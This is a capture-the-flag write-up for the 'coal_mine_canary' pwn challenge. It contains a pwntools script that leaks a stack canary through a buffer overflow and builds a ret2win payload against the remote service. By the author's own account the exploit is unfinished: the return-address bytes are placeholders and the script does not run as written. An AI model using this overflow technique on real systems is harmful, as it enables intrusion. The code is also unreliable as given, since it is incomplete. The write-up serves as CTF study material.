https://ctftime.org/event/2416

# coal_mine_canary (pwn)

Venture into the depths of the digital coal mine, where safety is paramount, and the trusty canary is your lifeline. Working in these digital depths can be hazardous, but fear not! Your canary is here to warn of dangers ahead. Can you decode the signals and navigate through the coal dust to uncover the hidden gems? Keep your canary singing and your wits sharp in this coal mine adventure!

nc 34.125.199.248 5674

## Solution

1) Leak the canary
2) ret2win via the `tweet_tweet` function

Note: due to some issues the binary in the handout and on the remote don't quite match as a result its only possible to solve this with some kind of bruteforce which I was not able to complete before the end of the ctf.

```python
#!/usr/bin/env python3

from pwn import *
import struct
import os

context.log_level = "debug"
elf = ELF("./challenge", checksec=False)
context.binary = elf

#p = elf.process()
p = remote("34.125.199.248", 5674)

p.sendline(str(32).encode())
p.readuntil(b"> ")
p.send(b"A" * 32)
p.readuntil(b"Ok... its name is ")
p.read(32)

canary = p.read(8)
log.success(canary.hex())

p = remote("34.125.199.248", 5674)
p.sendline(str(0x38 + 2).encode())

p.readuntil(b"> ")

payload = b""
payload += b"B" * 32
payload += canary
payload += b"\x00" * 16
payload += b"\x??\x??" # unclear what this should be
p.send(payload)

p.interactive()
```

## Flag
`OSCTF{.+}`

smiley 2024/07/13
